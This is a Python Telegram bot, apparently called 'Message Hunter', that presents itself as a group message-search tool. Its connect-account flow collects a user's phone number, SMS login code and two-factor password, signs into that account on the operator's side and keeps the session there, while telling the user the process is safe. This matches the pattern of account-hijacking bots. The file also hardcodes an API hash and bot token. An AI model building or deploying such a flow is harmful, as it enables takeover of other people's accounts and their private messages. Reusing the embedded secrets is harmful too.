from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import json
import asyncio
import time

# API данные
API_ID = 29318340
API_HASH = "68be30e447857e5e5aa24c23a41c686d"
BOT_TOKEN = "8083238823:AAHgAcvKL7nf29zz66kGB3bL6QCSHOVXCRA"

# Создаём бота
bot_app = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Состояния пользователей
user_states = {}
user_clients = {}
temp_auth_data = {}

def save_user_session(user_id, session_data):
    """Сохраняет сессию пользователя"""
    try:
        os.makedirs('user_sessions', exist_ok=True)
        with open(f'user_sessions/{user_id}.json', 'w', encoding='utf-8') as f:
            json.dump(session_data, f, ensure_ascii=False, indent=2)
        print(f"✅ Сессия сохранена для {user_id}")
        
        # Уведомляем веб-приложение
        with open('auth_notifications.txt', 'a') as f:
            f.write(f"{user_id}:SUCCESS\n")
            
    except Exception as e:
        print(f"❌ Ошибка сохранения сессии: {e}")
        with open('auth_notifications.txt', 'a') as f:
            f.write(f"{user_id}:ERROR:{str(e)}\n")

@bot_app.on_message(filters.command("start"))
def start_command(client, message):
    user_id = message.from_user.id
    
    # Проверяем есть ли параметр (для авторизации с сайта)
    if len(message.command) > 1:
        web_user_id = message.command[1]
        
        if web_user_id == "web_login":
            # Старая логика для веб-входа
            auth_code = f"WEB{user_id}"
            message.reply_text(
                f"🔐 Ваш код для входа в веб-интерфейс:\n\n"
                f"`{auth_code}`\n\n"
                f"Скопируйте этот код и вставьте на сайте."
            )
        else:
            # Новая логика для подключения аккаунта
            user_states[user_id] = {'web_user_id': web_user_id, 'step': 'waiting_phone'}
            
            message.reply_text(
                f"🔐 Подключение аккаунта для веб-приложения\n\n"
                f"📱 Отправьте ваш номер телефона в формате:\n"
                f"+380991234567\n\n"
                f"⚠️ Это безопасно - авторизация происходит через официальный Telegram API"
            )
    else:
        # Обычный старт - показываем кнопку веб-приложения
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔍 Открыть поиск", 
                                web_app={"url": "https://10ea-2a09-bac1-7540-10-00-84-95.ngrok-free.app"})]
        ])
        
        message.reply_text(
            "🔍 **Message Hunter**\n\n"
            "Поиск сообщений в Telegram группах\n\n"
            "Нажмите кнопку ниже для начала работы:",
            reply_markup=keyboard
        )

@bot_app.on_message(filters.text & filters.private & ~filters.command("start"))
async def handle_text(client, message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_states:
        await message.reply_text("Нажмите /start для начала")
        return
    
    user_data = user_states[user_id]
    
    if user_data['step'] == 'waiting_phone':
        if text.startswith('+') and len(text) >= 10:
            try:
                # Создаем клиент для пользователя
                session_name = f"user_session_{user_data['web_user_id']}"
                user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
                
                await user_client.connect()
                sent_code = await user_client.send_code(text)
                
                # Сохраняем данные
                user_clients[user_id] = user_client
                temp_auth_data[user_id] = {
                    'phone': text,
                    'phone_code_hash': sent_code.phone_code_hash
                }
                
                user_states[user_id]['step'] = 'waiting_code'
                
                await message.reply_text(
                    f"📨 Код отправлен на {text}\n\n"
                    f"⏱️ Введите 5-значный код из SMS БЫСТРО:"
                )
                
            except Exception as e:
                await message.reply_text(f"❌ Ошибка отправки кода: {str(e)}")
        else:
            await message.reply_text("❌ Неверный формат. Используйте: +380991234567")
    
    elif user_data['step'] == 'waiting_code':
        if text.isdigit() and len(text) == 5:
            try:
                auth_data = temp_auth_data[user_id]
                user_client = user_clients[user_id]
                
                # Авторизуемся
                await user_client.sign_in(
                    auth_data['phone'], 
                    auth_data['phone_code_hash'], 
                    text
                )
                
                # Получаем информацию
                me = await user_client.get_me()
                await user_client.disconnect()
                
                # Сохраняем сессию
                session_data = {
                    'is_connected': True,
                    'phone': auth_data['phone'],
                    'user_info': {
                        'first_name': me.first_name or '',
                        'last_name': me.last_name or '',
                        'username': me.username or '',
                        'user_id': str(me.id)
                    }
                }
                
                save_user_session(user_data['web_user_id'], session_data)
                
                # Очищаем данные
                del user_states[user_id]
                del temp_auth_data[user_id]
                del user_clients[user_id]
                
                # Отправляем успешное сообщение
                await message.reply_text(
                    f"✅ Аккаунт {me.first_name} успешно подключен!\n\n"
                    f"Теперь вернитесь на сайт и нажмите 'Проверить подключение'"
                )
                
            except Exception as e:
                if "SESSION_PASSWORD_NEEDED" in str(e):
                    user_states[user_id]['step'] = 'waiting_2fa'
                    await message.reply_text("🔐 Введите пароль двухфакторной аутентификации:")
                elif "PHONE_CODE_EXPIRED" in str(e):
                    await message.reply_text("⏰ Код истек. Начните заново с /start")
                    if user_id in user_states:
                        del user_states[user_id]
                    if user_id in temp_auth_data:
                        del temp_auth_data[user_id]
                    if user_id in user_clients:
                        try:
                            await user_clients[user_id].disconnect()
                        except:
                            pass
                        del user_clients[user_id]
                else:
                    await message.reply_text(f"❌ Ошибка: {str(e)}")
        else:
            await message.reply_text("❌ Введите 5-значный код")
    
    elif user_data['step'] == 'waiting_2fa':
        try:
            user_client = user_clients[user_id]
            await user_client.check_password(text)
            
            me = await user_client.get_me()
            await user_client.disconnect()
            
            session_data = {
                'is_connected': True,
                'phone': temp_auth_data[user_id]['phone'],
                'user_info': {
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'username': me.username or '',
                    'user_id': str(me.id)
                }
            }
            
            save_user_session(user_data['web_user_id'], session_data)
            
            # Очищаем данные
            del user_states[user_id]
            del temp_auth_data[user_id]
            del user_clients[user_id]
            
            await message.reply_text(
                f"✅ Аккаунт {me.first_name} успешно подключен!\n\n"
                f"Теперь вернитесь на сайт и нажмите 'Проверить подключение'"
            )
            
        except Exception as e:
            await message.reply_text(f"❌ Неверный пароль 2FA: {str(e)}")

if __name__ == "__main__":
    print("🤖 Основной бот запускается...")
    bot_app.run()